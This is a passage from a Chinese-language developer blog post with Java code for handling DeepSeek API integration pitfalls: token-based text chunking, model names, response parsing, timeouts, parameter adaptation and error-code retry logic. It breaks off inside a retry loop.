    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">EncodingRegistry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> Encodings.newDefaultEncodingRegistry();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Encoding</span> <span class="hljs-variable">encoding</span> <span class="hljs-operator">=</span> registry.getEncodingForModel(ModelType.GPT_4);
    <span class="hljs-comment">// 单轮最大Token数8192，留2000给模型回复，所以请求最多6192个Token</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_REQUEST_TOKENS</span> <span class="hljs-operator">=</span> <span class="hljs-number">8192</span> - <span class="hljs-number">2000</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ThreadSafeDeepSeekClient</span> <span class="hljs-variable">deepSeekClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadSafeDeepSeekClient</span>();

    <span class="hljs-comment">// 算文本的Token数，比按字数准多了</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">countTokens</span><span class="hljs-params">(String text)</span> {
        <span class="hljs-keyword">return</span> encoding.countTokens(text);
    }

    <span class="hljs-comment">// 超长文本分块，尽量不切句子</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">splitLongText</span><span class="hljs-params">(String longText)</span> {
        List&lt;String&gt; chunks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-type">int</span> <span class="hljs-variable">totalTokens</span> <span class="hljs-operator">=</span> countTokens(longText);

        <span class="hljs-comment">// 没超限制就直接返回</span>
        <span class="hljs-keyword">if</span> (totalTokens &lt;= MAX_REQUEST_TOKENS) {
            chunks.add(longText);
            <span class="hljs-keyword">return</span> chunks;
        }

        <span class="hljs-comment">// 按中文和英文的句号分割句子，保持意思完整</span>
        String[] sentences = longText.split(<span class="hljs-string">"(?&lt;=[。！？.?!])"</span>);
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">currentChunk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-type">int</span> <span class="hljs-variable">currentTokens</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

        <span class="hljs-keyword">for</span> (String sentence : sentences) {
            <span class="hljs-type">int</span> <span class="hljs-variable">sentenceTokens</span> <span class="hljs-operator">=</span> countTokens(sentence);
            <span class="hljs-comment">// 极端情况：一个句子就超了，那就按Token硬切</span>
            <span class="hljs-keyword">if</span> (sentenceTokens &gt; MAX_REQUEST_TOKENS) {
                chunks.addAll(splitOverLengthSentence(sentence, MAX_REQUEST_TOKENS));
                <span class="hljs-keyword">continue</span>;
            }
            <span class="hljs-comment">// 加当前句子会超的话，先把之前的存起来</span>
            <span class="hljs-keyword">if</span> (currentTokens + sentenceTokens &gt; MAX_REQUEST_TOKENS) {
                chunks.add(currentChunk.toString().trim());
                currentChunk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
                currentTokens = <span class="hljs-number">0</span>;
            }
            currentChunk.append(sentence);
            currentTokens += sentenceTokens;
        }

        <span class="hljs-comment">// 把最后一块加进去</span>
        <span class="hljs-keyword">if</span> (currentChunk.length() &gt; <span class="hljs-number">0</span>) {
            chunks.add(currentChunk.toString().trim());
        }

        <span class="hljs-keyword">return</span> chunks;
    }

    <span class="hljs-comment">// 单个句子超Token限制，按Token硬切</span>
    <span class="hljs-keyword">private</span> List&lt;String&gt; <span class="hljs-title function_">splitOverLengthSentence</span><span class="hljs-params">(String sentence, <span class="hljs-type">int</span> maxTokens)</span> {
        List&lt;String&gt; subChunks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-type">char</span>[] chars = sentence.toCharArray();
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">subChunk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-type">int</span> <span class="hljs-variable">currentTokens</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : chars) {
            <span class="hljs-type">String</span> <span class="hljs-variable">charStr</span> <span class="hljs-operator">=</span> String.valueOf(c);
            <span class="hljs-type">int</span> <span class="hljs-variable">charTokens</span> <span class="hljs-operator">=</span> countTokens(charStr);
            <span class="hljs-keyword">if</span> (currentTokens + charTokens &gt; maxTokens) {
                subChunks.add(subChunk.toString().trim());
                subChunk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
                currentTokens = <span class="hljs-number">0</span>;
            }
            subChunk.append(c);
            currentTokens += charTokens;
        }

        <span class="hljs-keyword">if</span> (subChunk.length() &gt; <span class="hljs-number">0</span>) {
            subChunks.add(subChunk.toString().trim());
        }
        <span class="hljs-keyword">return</span> subChunks;
    }

    <span class="hljs-comment">// 分块调用API，最后拼结果</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processLongText</span><span class="hljs-params">(String longText)</span> {
        List&lt;String&gt; chunks = splitLongText(longText);
        <span class="hljs-comment">// 就一块的话直接调</span>
        <span class="hljs-keyword">if</span> (chunks.size() == <span class="hljs-number">1</span>) {
            <span class="hljs-keyword">return</span> deepSeekClient.asyncCall(chunks.get(<span class="hljs-number">0</span>)).join();
        }

        <span class="hljs-comment">// 多块的话异步调用，效率高</span>
        List&lt;CompletableFuture&lt;String&gt;&gt; futures = chunks.stream()
                .map(chunk -&gt; {
                    <span class="hljs-comment">// 告诉模型这是第几块，总共多少块，让它有上下文</span>
                    <span class="hljs-type">String</span> <span class="hljs-variable">prompt</span> <span class="hljs-operator">=</span> <span class="hljs-string">"请处理以下文本片段（一共"</span> + chunks.size() + <span class="hljs-string">"段，这是第"</span> + (chunks.indexOf(chunk) + <span class="hljs-number">1</span>) + <span class="hljs-string">"段）：\n"</span> + chunk;
                    <span class="hljs-keyword">return</span> deepSeekClient.asyncCall(prompt);
                })
                .collect(Collectors.toList());

        <span class="hljs-comment">// 等所有调用都完成</span>
        CompletableFuture&lt;Void&gt; allDone = CompletableFuture.allOf(futures.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>[<span class="hljs-number">0</span>]));
        allDone.join();

        <span class="hljs-comment">// 拼结果</span>
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">finalResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        finalResult.append(<span class="hljs-string">"超长文本处理结果（按片段拼接）：\n"</span>);
        <span class="hljs-keyword">for</span> (CompletableFuture&lt;String&gt; future : futures) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">String</span> <span class="hljs-variable">chunkRes</span> <span class="hljs-operator">=</span> future.get();
                <span class="hljs-comment">// 提取回复内容，实际项目里用FastJSON或者Jackson解析更靠谱</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> extractContent(chunkRes);
                finalResult.append(content).append(<span class="hljs-string">"\n"</span>);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                finalResult.append(<span class="hljs-string">"【这段处理失败】："</span>).append(e.getMessage()).append(<span class="hljs-string">"\n"</span>);
            }
        }

        <span class="hljs-keyword">return</span> finalResult.toString();
    }

    <span class="hljs-comment">// 从API响应里把回复内容抠出来（简化版，实际用JSON库）</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">extractContent</span><span class="hljs-params">(String response)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">contentStart</span> <span class="hljs-operator">=</span> response.indexOf(<span class="hljs-string">"\"content\":\""</span>) + <span class="hljs-number">10</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">contentEnd</span> <span class="hljs-operator">=</span> response.indexOf(<span class="hljs-string">"\"}"</span>, contentStart);
        <span class="hljs-keyword">if</span> (contentStart &gt; <span class="hljs-number">0</span> &amp;&amp; contentEnd &gt; contentStart) {
            <span class="hljs-keyword">return</span> response.substring(contentStart, contentEnd);
        }
        <span class="hljs-keyword">return</span> response;
    }
}
</code></pre>
<h3 data-id="heading-18">关键优化点说明</h3>
<ol>
<li><strong>精准Token计算</strong>：使用 jtokkit 库（适配 OpenAI/DeepSeek 的 Token 编码规则），准确计算文本 Token 数，避免按字符数分割导致的误差；</li>
<li><strong>语义化分块</strong>：优先按句子分割，保留文本语义完整性，避免截断导致的上下文丢失；</li>
<li><strong>极端情况处理</strong>：单个句子超出 Token 限制时，按 Token 数切割，保证分块后能正常调用 API；</li>
<li><strong>异步分块调用</strong>：多块文本异步调用 API，提高处理效率，最后拼接结果；</li>
<li><strong>上下文标识</strong>：给每个分块添加段数标识，让模型理解当前处理的是超长文本的一部分，提升回复质量。</li>
</ol>
<h2 data-id="heading-19">四、坑 4：模型名称配置错误</h2>
<h3 data-id="heading-20">问题本质</h3>
<p>不同模型的名称规范不同（如 ChatGPT 是 <code>gpt-3.5-turbo</code>，文心一言是 <code>ernie-bot</code>），若将其他模型的名称直接套用在 DeepSeek 上，会返回 404 错误（模型不存在）。</p>
<h3 data-id="heading-21">解决方案</h3>
<p>搞个枚举类存DeepSeek的模型名：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// DeepSeek模型名枚举，直接拿过来用</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekModelEnum</span> {
    <span class="hljs-comment">// 通用对话、代码生成、推理增强，常用的就这三个</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEEPSEEK_CHAT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"deepseek-chat"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEEPSEEK_CODER</span> <span class="hljs-operator">=</span> <span class="hljs-string">"deepseek-coder"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEEPSEEK_R1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"deepseek-r1"</span>;

    <span class="hljs-comment">// 如果你之前用别的模型，用这个方法转成DeepSeek的</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">convertFromOtherModel</span><span class="hljs-params">(String otherModelName)</span> {
        <span class="hljs-keyword">switch</span> (otherModelName.toLowerCase()) {
            <span class="hljs-comment">// 之前用GPT-3.5或文心一言的对话场景，转成deepseek-chat</span>
            <span class="hljs-keyword">case</span> <span class="hljs-string">"gpt-3.5-turbo"</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-string">"ernie-bot"</span>:
                <span class="hljs-keyword">return</span> DEEPSEEK_CHAT;
            <span class="hljs-comment">// 之前用代码模型的，转成deepseek-coder</span>
            <span class="hljs-keyword">case</span> <span class="hljs-string">"code-davinci-002"</span>:
                <span class="hljs-keyword">return</span> DEEPSEEK_CODER;
            <span class="hljs-comment">// 其他情况默认用通用对话模型</span>
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> DEEPSEEK_CHAT;
        }
    }
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelClient</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callWithRightModel</span><span class="hljs-params">(String prompt)</span> {
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-comment">// 直接用枚举里的模型名，肯定不会错</span>
        requestBody.put(<span class="hljs-string">"model"</span>, DeepSeekModelEnum.DEEPSEEK_CHAT);
        <span class="hljs-comment">// 其他参数...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }
}
</code></pre>
<h2 data-id="heading-22">五、坑 5：响应参数解析错误</h2>
<h3 data-id="heading-23">问题本质</h3>
<p>虽然DeepSeek响应格式和OpenAI像，但有些字段不一样，比如<code>finish_reason</code>的取值、<code>usage</code>里的统计方式。有人直接抄ChatGPT的解析代码，结果要么字段拿不到，要么报解析异常。</p>
<h3 data-id="heading-24">解决方案</h3>
<p>搞个专门的解析工具，兼容这些差异：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;

<span class="hljs-comment">// DeepSeek响应解析工具类（适配字段差异）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekResponseParser</span> {
    <span class="hljs-comment">// 提取回复内容</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getContent</span><span class="hljs-params">(String responseJson)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> JSON.parseObject(responseJson);
            <span class="hljs-comment">// 兼容DeepSeek和OpenAI的响应结构</span>
            <span class="hljs-keyword">if</span> (root.containsKey(<span class="hljs-string">"choices"</span>) &amp;&amp; !root.getJSONArray(<span class="hljs-string">"choices"</span>).isEmpty()) {
                <span class="hljs-type">JSONObject</span> <span class="hljs-variable">choice</span> <span class="hljs-operator">=</span> root.getJSONArray(<span class="hljs-string">"choices"</span>).getJSONObject(<span class="hljs-number">0</span>);
                <span class="hljs-comment">// DeepSeek的message字段与OpenAI一致，但需判空</span>
                <span class="hljs-keyword">if</span> (choice.containsKey(<span class="hljs-string">"message"</span>)) {
                    <span class="hljs-keyword">return</span> choice.getJSONObject(<span class="hljs-string">"message"</span>).getString(<span class="hljs-string">"content"</span>);
                }
            }
            <span class="hljs-comment">// 要是有error字段，直接抛异常</span>
            <span class="hljs-keyword">if</span> (root.containsKey(<span class="hljs-string">"error"</span>)) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"API报错："</span> + root.getJSONObject(<span class="hljs-string">"error"</span>).getString(<span class="hljs-string">"message"</span>));
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"没拿到有效回复"</span>;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"解析响应失败："</span> + e.getMessage());
        }
    }

    <span class="hljs-comment">// 解析Token使用量（适配DeepSeek的usage字段）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getUsedTokens</span><span class="hljs-params">(String responseJson)</span> {
        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> JSON.parseObject(responseJson);
        <span class="hljs-keyword">if</span> (root.containsKey(<span class="hljs-string">"usage"</span>)) {
            <span class="hljs-keyword">return</span> root.getJSONObject(<span class="hljs-string">"usage"</span>).getIntValue(<span class="hljs-string">"total_tokens"</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParserClient</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parseResponse</span><span class="hljs-params">(String response)</span> {
        <span class="hljs-comment">// 直接拿回复内容，不用自己处理JSON</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> DeepSeekResponseParser.getContent(response);
        <span class="hljs-comment">// 看看用了多少Token</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">usedTokens</span> <span class="hljs-operator">=</span> DeepSeekResponseParser.getUsedTokens(response);
        System.out.println(<span class="hljs-string">"回复："</span> + content);
        System.out.println(<span class="hljs-string">"消耗Token："</span> + usedTokens);
    }
}
</code></pre>
<h2 data-id="heading-25">六、坑 6：超时配置不匹配</h2>
<h3 data-id="heading-26">问题本质</h3>
<p>DeepSeek API 的响应速度与模型类型、文本长度相关（如 deepseek-coder 处理代码时响应较慢），若直接复用 ChatGPT 的超时配置（如 10 秒），会导致频繁超时；反之，超时配置过长会导致线程阻塞。</p>
<h3 data-id="heading-27">解决方案</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 动态超时配置工具</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeoutConfig</span> {
    <span class="hljs-comment">// 不同模型的基础超时时间（毫秒）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CHAT_TIMEOUT</span> <span class="hljs-operator">=</span> <span class="hljs-number">30000</span>; <span class="hljs-comment">// 对话模型30秒</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CODER_TIMEOUT</span> <span class="hljs-operator">=</span> <span class="hljs-number">60000</span>; <span class="hljs-comment">// 代码模型60秒</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">R1_TIMEOUT</span> <span class="hljs-operator">=</span> <span class="hljs-number">45000</span>; <span class="hljs-comment">// 推理模型45秒</span>

    <span class="hljs-comment">// 按模型拿基础超时</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBaseTimeout</span><span class="hljs-params">(String modelName)</span> {
        <span class="hljs-keyword">switch</span> (modelName) {
            <span class="hljs-keyword">case</span> DeepSeekModelEnum.DEEPSEEK_CODER:
                <span class="hljs-keyword">return</span> CODER_TIMEOUT;
            <span class="hljs-keyword">case</span> DeepSeekModelEnum.DEEPSEEK_R1:
                <span class="hljs-keyword">return</span> R1_TIMEOUT;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> CHAT_TIMEOUT;
        }
    }

    <span class="hljs-comment">// 按文本长度加超时，长文本给更多时间</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDynamicTimeout</span><span class="hljs-params">(String modelName, String text)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">baseTimeout</span> <span class="hljs-operator">=</span> getBaseTimeout(modelName);
        <span class="hljs-type">int</span> <span class="hljs-variable">textLen</span> <span class="hljs-operator">=</span> text.length();
        <span class="hljs-comment">// 每1000字加5秒，最多不超过基础超时的2倍（别无限加）</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">extraTimeout</span> <span class="hljs-operator">=</span> Math.min((textLen / <span class="hljs-number">1000</span>) * <span class="hljs-number">5000</span>, baseTimeout);
        <span class="hljs-keyword">return</span> baseTimeout + extraTimeout;
    }
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeoutClient</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callWithDynamicTimeout</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> DeepSeekModelEnum.DEEPSEEK_CODER;
        <span class="hljs-comment">// 按模型和文本长度算超时</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">timeout</span> <span class="hljs-operator">=</span> TimeoutConfig.getDynamicTimeout(model, prompt);

        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        requestBody.put(<span class="hljs-string">"model"</span>, model);
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)));
        requestBody.put(<span class="hljs-string">"timeout"</span>, timeout); <span class="hljs-comment">// 把算好的超时传进去</span>

        <span class="hljs-comment">// 其他请求逻辑...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }
}
</code></pre>
<h2 data-id="heading-28">七、坑 7：请求参数不兼容</h2>
<h3 data-id="heading-29">问题本质</h3>
<p>有些参数在别的模型里有用，但DeepSeek不支持，比如ChatGPT的<code>frequency_penalty</code>（重复惩罚），传了DeepSeek也不理；还有<code>temperature</code>（随机性），ChatGPT支持0-2，DeepSeek只支持0-1，传1.5过去就会被强制调整。</p>
<h3 data-id="heading-30">解决方案</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">// 请求参数适配工具</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParamsAdapter</span> {
    <span class="hljs-comment">// DeepSeek不支持的参数列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; UNSUPPORTED_PARAMS = List.of(
            <span class="hljs-string">"frequency_penalty"</span>, <span class="hljs-string">"presence_penalty"</span>, <span class="hljs-string">"logit_bias"</span>
    );

    <span class="hljs-comment">// 适配参数，保证传过去的都能用</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title function_">adapt</span><span class="hljs-params">(Map&lt;String, Object&gt; originalParams)</span> {
        Map&lt;String, Object&gt; adaptedParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(originalParams);

        <span class="hljs-comment">// 1. 把不支持的参数删掉</span>
        UNSUPPORTED_PARAMS.forEach(adaptedParams::remove);

        <span class="hljs-comment">// 2. 修正temperature：只能0-1</span>
        <span class="hljs-keyword">if</span> (adaptedParams.containsKey(<span class="hljs-string">"temperature"</span>)) {
            <span class="hljs-type">double</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>) adaptedParams.get(<span class="hljs-string">"temperature"</span>);
            <span class="hljs-comment">// 小于0取0，大于1取1，中间的不变</span>
            adaptedParams.put(<span class="hljs-string">"temperature"</span>, Math.min(Math.max(temp, <span class="hljs-number">0.0</span>), <span class="hljs-number">1.0</span>));
        }

        <span class="hljs-comment">// 3. 修正max_tokens：最少10，最多4096</span>
        <span class="hljs-keyword">if</span> (adaptedParams.containsKey(<span class="hljs-string">"max_tokens"</span>)) {
            <span class="hljs-type">int</span> <span class="hljs-variable">maxTokens</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) adaptedParams.get(<span class="hljs-string">"max_tokens"</span>);
            adaptedParams.put(<span class="hljs-string">"max_tokens"</span>, Math.min(Math.max(maxTokens, <span class="hljs-number">10</span>), <span class="hljs-number">4096</span>));
        }

        <span class="hljs-keyword">return</span> adaptedParams;
    }
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParamsClient</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callWithRightParams</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-comment">// 原来的参数，可能有无效的</span>
        Map&lt;String, Object&gt; originalParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        originalParams.put(<span class="hljs-string">"model"</span>, DeepSeekModelEnum.DEEPSEEK_CHAT);
        originalParams.put(<span class="hljs-string">"temperature"</span>, <span class="hljs-number">1.5</span>); <span class="hljs-comment">// 超出DeepSeek的范围</span>
        originalParams.put(<span class="hljs-string">"frequency_penalty"</span>, <span class="hljs-number">0.5</span>); <span class="hljs-comment">// DeepSeek不支持</span>
        originalParams.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)));

        <span class="hljs-comment">// 适配后再传</span>
        Map&lt;String, Object&gt; adaptedParams = ParamsAdapter.adapt(originalParams);
        <span class="hljs-comment">// 其他请求逻辑...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }
}
</code></pre>
<h2 data-id="heading-31">八、坑 8：错误码处理不兼容</h2>
<h3 data-id="heading-32">问题本质</h3>
<p>同样是429错误，DeepSeek表示“请求太频繁，触发限流了”，但文心一言可能表示“Token用完了”；还有500错误，有人以为是自己代码的问题，其实是DeepSeek服务端的问题，白查半天。</p>
<h3 data-id="heading-33">解决方案</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.web.client.HttpClientErrorException;

<span class="hljs-comment">// 错误码适配工具类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekErrorHandler</span> {
    <span class="hljs-comment">// DeepSeek常见错误码说明</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ErrorCode</span> {
        TOKEN_EXPIRED(<span class="hljs-number">401</span>, <span class="hljs-string">"Token过期或无效，该刷新了"</span>),
        RATE_LIMIT(<span class="hljs-number">429</span>, <span class="hljs-string">"请求太频繁，歇会儿再试"</span>),
        TOO_LONG(<span class="hljs-number">400</span>, <span class="hljs-string">"文本太长，超过Token限制了"</span>),
        MODEL_NOT_FOUND(<span class="hljs-number">404</span>, <span class="hljs-string">"模型名填错了"</span>),
        SERVER_ERROR(<span class="hljs-number">500</span>, <span class="hljs-string">"DeepSeek服务端出问题了"</span>);

        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> code;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;

        ErrorCode(<span class="hljs-type">int</span> code, String desc) {
            <span class="hljs-built_in">this</span>.code = code;
            <span class="hljs-built_in">this</span>.desc = desc;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> code;
        }

        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> desc;
        }
    }

    <span class="hljs-comment">// 处理DeepSeek错误，返回适配的重试策略</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">needRetry</span><span class="hljs-params">(Exception e)</span> {
        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> HttpClientErrorException) {
            <span class="hljs-type">int</span> <span class="hljs-variable">statusCode</span> <span class="hljs-operator">=</span> ((HttpClientErrorException) e).getStatusCode().value();
            <span class="hljs-comment">// 限流和服务端错误可以重试，其他的别瞎试</span>
            <span class="hljs-keyword">return</span> statusCode == ErrorCode.RATE_LIMIT.getCode()
                    || statusCode == ErrorCode.SERVER_ERROR.getCode();
        }
        <span class="hljs-comment">// 网络超时、连接失败这些也可以重试</span>
        <span class="hljs-keyword">return</span> e <span class="hljs-keyword">instanceof</span> java.net.SocketTimeoutException
                || e <span class="hljs-keyword">instanceof</span> java.net.ConnectException;
    }

    <span class="hljs-comment">// 获取错误描述，适配不同模型的错误码</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getErrorMsg</span><span class="hljs-params">(Exception e)</span> {
        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> HttpClientErrorException) {
            <span class="hljs-type">HttpClientErrorException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> (HttpClientErrorException) e;
            <span class="hljs-type">int</span> <span class="hljs-variable">statusCode</span> <span class="hljs-operator">=</span> ex.getStatusCode().value();
            <span class="hljs-comment">// 匹配错误码</span>
            <span class="hljs-keyword">for</span> (ErrorCode errorCode : ErrorCode.values()) {
                <span class="hljs-keyword">if</span> (errorCode.getCode() == statusCode) {
                    <span class="hljs-keyword">return</span> errorCode.getDesc() + <span class="hljs-string">"，详情："</span> + ex.getResponseBodyAsString();
                }
            }
        }
        <span class="hljs-comment">// 其他错误直接返回信息</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"未知错误："</span> + e.getMessage();
    }
}

<span class="hljs-comment">// 调用示例，带重试逻辑</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryClient</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_RETRY</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; <span class="hljs-comment">// 最多重试3次</span>

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callWithRetry</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">retryCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (retryCount &lt; MAX_RETRY) {
